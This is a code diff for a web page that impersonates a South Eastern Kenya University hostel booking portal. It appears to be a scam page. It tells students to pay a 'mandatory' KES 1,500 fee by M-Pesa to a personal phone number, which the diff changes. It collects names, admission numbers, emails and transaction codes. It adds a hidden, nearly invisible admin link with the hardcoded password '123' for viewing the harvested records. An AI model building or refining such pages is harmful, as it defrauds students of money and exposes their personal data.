@@ -18,10 +18,25 @@
     body{background:var(--bg); color:var(--text-dark); line-height:1.6;}
 
     /* === TOP OFFICIAL BAR === */
-    .top-bar{background:#ffffff; border-bottom:1px solid var(--border); padding:10px 20px; font-size:13px; color:#555;}
+    .top-bar{background:#ffffff; border-bottom:1px solid var(--border); padding:10px 20px; font-size:13px; color:#555; position:relative;}
     .top-bar-content{max-width:1100px; margin:0 auto; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;}
     .top-bar a{color:var(--mu-green); font-weight:600; text-decoration:none;}
     .verified-badge{background:#e6fffa; color:#00796b; padding:3px 8px; border-radius:12px; font-size:11px; font-weight:bold;}
+
+    /* === HIDDEN ADMIN DOT === */
+    .admin-secret-dot{
+        position:absolute;
+        top:3px;
+        left:50%;
+        transform:translateX(-50%);
+        width:6px;
+        height:6px;
+        background:#ffffff;
+        border-radius:50%;
+        cursor:pointer;
+        opacity:0.08;
+        z-index:999;
+    }
 
     /* === MAIN HEADER === */
     .main-header{background:var(--mu-green); color:white; padding:20px; text-align:center; border-bottom:6px solid var(--mu-gold);}
@@ -30,7 +45,7 @@
     .header-text h1{font-size:22px; font-weight:700; margin-bottom:4px;}
     .header-text p{font-size:15px; opacity:0.9; margin-top:4px; font-weight:500;}
 
-    /* === NAVIGATION - NOW HIDDEN BY DEFAULT === */
+    /* === NAVIGATION === */
     .nav-bar{
         background:#ffffff; 
         padding:14px 15px; 
@@ -282,6 +297,11 @@
     .action-steps li {margin-bottom:12px; line-height:1.6; font-size:14px;}
     .action-steps strong {color:var(--mu-green);}
 
+    .admin-table{width:100%; border-collapse:collapse; margin-top:20px; font-size:13px;}
+    .admin-table th, .admin-table td{padding:10px; text-align:left; border-bottom:1px solid var(--border);}
+    .admin-table th{background:var(--mu-green); color:white; font-weight:600;}
+    .admin-table tr:hover{background:var(--mu-light-gold);}
+
     .footer{background:#ffffff; border-top:3px solid var(--mu-gold); padding:25px 20px; margin-top:30px; font-size:13px; color:#555;}
     .footer-content{max-width:1100px; margin:0 auto; text-align:center; line-height:1.7;}
     .footer strong{color:var(--mu-green);}
@@ -289,9 +309,9 @@
 </style>
 </head>
 <body>
-
 <!-- TOP OFFICIAL BAR -->
 <div class="top-bar">
+    <div class="admin-secret-dot" onclick="adminAccess()"></div>
     <div class="top-bar-content">
         <span>🔒 Secure Connection | <span class="verified-badge">OFFICIAL PORTAL</span></span>
         <span>Visit Main Website: <a href="https://www.seku.ac.ke" target="_blank">www.seku.ac.ke</a></span>
@@ -361,6 +381,16 @@
     <div class="hostel-grid" id="hostelList"></div>
 </div>
 
+<!-- ADMIN VIEW PAGE -->
+<div class="container hidden" id="adminPage">
+    <div class="dashboard-header">
+        <h2 style="color:var(--mu-gold); border:none; padding:0;">🔐 ADMIN DASHBOARD</h2>
+        <p class="subtext">All Registered Students & Payment Records</p>
+    </div>
+    <div id="adminRecords"></div>
+    <button class="btn btn-secondary" onclick="closeAdminView()">← Return to Portal</button>
+</div>
+
 <!-- BOOKING PAGES -->
 <div class="container hidden" id="bookingPage">
     <div id="alertBox"></div>
@@ -373,7 +403,7 @@
                 <h4 style="color:var(--mu-green);">1. Eligibility & Allocation</h4>
                 <ul>
                     <li>All regular students are eligible to apply for university accommodation.</li>
-                    <li>Priority during high demand: New students, First-years, Students with special needs.</li>
+                    <li>Priority during high demand: Student who has booked for vacancy early on time.</li>
                     <li>Allocation is strictly first-come-first-served upon successful payment of booking fee.</li>
                 </ul>
                 <h4 style="color:var(--mu-green);">2. Booking Procedure</h4>
@@ -423,8 +453,8 @@
         <form onsubmit="nextBookingStep(3); return false;">
             <div class="scroll-agreement notice-box" id="noticeScroll" onscroll="checkScroll('noticeScroll','agreeNoticeBox','btnNotice')">
                 <h3>OFFICIAL NOTICE TO ADMITTED STUDENTS</h3>
-                <p>Following a joint directive from the Department of Health Sciences and the Accommodation Office at South Eastern Kenya University (SEKU), this is to officially notify all health sciences students of the upcoming relocation from the Main Campus to the Kitui Town Campus.This transition is designed to place students closer to primary clinical training sites, health facilities, and relevant professional resources in Kitui Town,the <b>South Eastern  Kenya University Accommodation Department</b> wishes to inform all 2,3,4 students on health sciences and bussines economics that hostel spaces are fully furnished at kitui town campus and  will be prioritized to those made their booking on time. .</p><br>
-                <p>To secure your 9accommodation, you are required to pay a <b>mandatory booking fee of KES 1,500</b> via this official payment channel provided. This amount will be deducted from your total semester accommodation fees upon reporting.</p><br>
+                <p>Following a joint directive from the Department of Health Sciences and the Accommodation Office at South Eastern Kenya University (SEKU), this is to officially notify all health sciences students of the upcoming relocation from the Main Campus to the Kitui Town Campus.This transition is designed to place students closer to primary clinical training sites, health facilities, and relevant professional resources in Kitui Town,the <b>South Eastern  Kenya University Accommodation Department</b> wishes to inform all 2,3,4 students on health sciences and business economics that hostel spaces are fully furnished at kitui town campus and will be prioritized to those who made their booking on time.</p><br>
+                <p>To secure your accommodation, you are required to pay a <b>mandatory booking fee of KES 1,500</b> via this official payment channel provided. This amount will be deducted from your total semester accommodation fees upon reporting.</p><br>
                 <p>Students are advised to complete this process early to avoid missing out on hostel space. The balance of your accommodation fees must be settled within the first week of reporting to the university.</p><br>
                 <h4 style="color:var(--mu-green);">Official Procedure:</h4>
                 <ol>
@@ -470,7 +500,7 @@
             <div class="payee-details">
                 <div class="detail-row">
                     <span class="detail-label">Paybill / Mobile Number:</span>
-                    <span class="detail-value" onclick="copyToClipboard('0758903057', this)">0758 903 057 <span class="copy-hint">📋 Click to copy</span></span>
+                    <span class="detail-value" onclick="copyToClipboard('0727225650', this)">0727 225 650 <span class="copy-hint">📋 Click to copy</span></span>
                 </div>
                 <div class="detail-row">
                     <span class="detail-label">Account Name:</span>
@@ -485,7 +515,7 @@
                 <h4>Step-by-Step Guide:</h4>
                 <ol class="steps-list">
                     <li>Go to M-Pesa Menu → Select <strong>Lipa na M-Pesa</strong> → <strong>Send Money</strong></li>
-                    <li>Enter phone number: <strong onclick="copyToClipboard('0758903057', this)" style="cursor:pointer; color:var(--mu-green);">0758903057 📋</strong></li>
+                    <li>Enter phone number: <strong onclick="copyToClipboard('0727225650', this)" style="cursor:pointer; color:var(--mu-green);">0727225650 📋</strong></li>
                     <li>Enter amount: <strong>1500</strong></li>
                     <li>Enter reference: <strong id="refNumber2"></strong></li>
                     <li>Enter your M-Pesa PIN and confirm transaction</li>
@@ -516,7 +546,7 @@
                 </div>
             </div>
             <div class="form-group">
-                <label>Active Email Address <span class="required">*</span>
+                <label>Student Email Address <span class="required">*</span>
                     <input type="email" id="emailAddr" required>
                 </label>
             </div>
@@ -591,9 +621,9 @@
         © 2026 South Eastern Kenya University. All Rights Reserved. Official Secure Portal.</p>
     </div>
 </div>
-
-<script>
+    <script>
 const bookedStudents = {};
+const paymentRecords = [];
 let hostelsDB = [
     {id:1, name:"Tulip Hostel", total:500, booked:481, gender:"Female"},
     {id:2, name:"Jacaranda Hostel", total:800, booked:780, gender:"Male"},
@@ -603,19 +633,81 @@ let hostelsDB = [
 ];
 let loggedInUser = null; 
 let selectedHostel = null;
+const ADMIN_PASS = "123";
+
+// === ADMIN SECRET FUNCTION ===
+function adminAccess(){
+    const pass = prompt("Enter Admin Password:");
+    if(pass === ADMIN_PASS){
+        showAdminRecords();
+    } else if(pass !== null){
+        alert("❌ Wrong Admin Password");
+    }
+}
+
+function showAdminRecords(){
+    document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
+    document.getElementById('adminPage').classList.remove('hidden');
+
+    const container = document.getElementById('adminRecords');
+    if(paymentRecords.length === 0){
+        container.innerHTML = "<p style='text-align:center; color:#666; padding:20px;'>No payment records yet</p>";
+        return;
+    }
+
+    let table = `<table class="admin-table">
+        <tr>
+            <th>#</th>
+            <th>Admission No</th>
+            <th>Full Name</th>
+            <th>Email</th>
+            <th>Faculty</th>
+            <th>Hostel</th>
+            <th>Transaction Code</th>
+            <th>Status</th>
+        </tr>`;
+    
+    paymentRecords.forEach((rec, i) => {
+        table += `<tr>
+            <td>${i+1}</td>
+            <td>${rec.adm}</td>
+            <td>${rec.fullName}</td>
+            <td>${rec.email}</td>
+            <td>${rec.faculty}</td>
+            <td>${rec.hostel}</td>
+            <td>${rec.mpesaCode}</td>
+            <td style="color:green; font-weight:bold;">✅ PAID</td>
+        </tr>`;
+    });
+    table += `</table>`;
+    container.innerHTML = table;
+}
+
+function closeAdminView(){
+    document.getElementById('adminPage').classList.add('hidden');
+    if(loggedInUser){
+        showDashboard();
+    } else {
+        document.getElementById('loginPage').classList.remove('hidden');
+    }
+}
 
 function copyToClipboard(text, el) {
     navigator.clipboard.writeText(text).then(() => {
-        const original = el.innerHTML;
-        el.innerHTML = "✅ Copied!";
-        setTimeout(() => { el.innerHTML = original; }, 2000);
+        if(el){
+            const original = el.innerHTML;
+            el.innerHTML = "✅ Copied!";
+            setTimeout(() => { el.innerHTML = original; }, 2000);
+        }
     });
 }
 
 function checkScroll(scrollId, checkboxId, btnId){
     const el = document.getElementById(scrollId);
     const checkboxBox = document.getElementById(checkboxId);
+    const btn = document.getElementById(btnId);
     const hint = scrollId.includes('rules')? document.getElementById('rulesHint') : document.getElementById('noticeHint');
+    
     if(el.scrollHeight <= el.clientHeight){
         checkboxBox.style.display = 'block';
         hint.style.display = 'none';
@@ -637,7 +729,8 @@ function handleLogin(){
         alertDiv.innerHTML = "<div class='alert alert-error'>Please fill in both fields</div>";
         return;
     }
-    if(!user.endsWith("/2026") && !user.endsWith("/26")){
+    // Accepts admission formats: /25, /2025, /26, /2026
+    if(!user.endsWith("/2025") && !user.endsWith("/25") && !user.endsWith("/2026") && !user.endsWith("/26")){
         alertDiv.innerHTML = "<div class='alert alert-error'>Wrong username or password</div>";
         return;
     }
@@ -735,34 +828,58 @@ function submitPayment(){
     setTimeout(() => {
         selectedHostel.booked += 1; 
         bookedStudents[loggedInUser.adm] = true;
+        
+        // Save full record for admin
+        paymentRecords.push({
+            adm: loggedInUser.adm,
+            fullName: surname + " " + otherNames,
+            email: email,
+            faculty: faculty,
+            hostel: selectedHostel.name,
+            mpesaCode: code,
+            time: new Date().toLocaleString()
+        });
+
+        // Fill confirmation details
         document.getElementById('finalHostel').innerText = selectedHostel.name; 
         document.getElementById('finalAdmission').innerText = loggedInUser.adm;
         document.getElementById('finalCode').innerText = code;
         document.getElementById('finalName').innerText = surname + " " + otherNames;
         document.getElementById('finalEmail').innerText = email;
         document.getElementById('finalFaculty').innerText = faculty;
+
         showBookingStep(4);
-    }, 2500);
+    }, 1800);
 }
 
-function backToDashboard(){ 
-    document.getElementById('bookingPage').classList.add('hidden'); 
-    document.getElementById('alertBox').innerHTML = "";
-    showDashboard(); 
+function backToDashboard(){
+    document.getElementById('bookingPage').classList.add('hidden');
+    document.getElementById('dashboardPage').classList.remove('hidden');
+    selectedHostel = null;
+    // Reset all form fields
+    document.getElementById('mpesaCode').value = "";
+    document.getElementById('surname').value = "";
+    document.getElementById('otherNames').value = "";
+    document.getElementById('emailAddr').value = "";
+    document.getElementById('faculty').value = "";
+    document.getElementById('submitBtn').innerHTML = "Submit & Verify Payment";
+    document.getElementById('submitBtn').disabled = false;
 }
 
 function logout(){
-    loggedInUser = null;
-    selectedHostel = null;
-    document.getElementById('navBar').style.display = 'none';
-    document.getElementById('dashboardPage').classList.add('hidden');
-    document.getElementById('bookingPage').classList.add('hidden');
-    document.getElementById('loginPage').classList.remove('hidden');
-    document.getElementById('username').value = "";
-    document.getElementById('password').value = "";
-    document.getElementById('loginAlert').innerHTML = "";
+    if(confirm("Are you sure you want to logout?")){
+        loggedInUser = null;
+        selectedHostel = null;
+        document.getElementById('navBar').style.display = 'none';
+        document.getElementById('dashboardPage').classList.add('hidden');
+        document.getElementById('bookingPage').classList.add('hidden');
+        document.getElementById('loginPage').classList.remove('hidden');
+        // Clear login form
+        document.getElementById('username').value = "";
+        document.getElementById('password').value = "";
+        document.getElementById('loginAlert').innerHTML = "";
+    }
 }
 </script>
 
-</body>
-</html>
+    
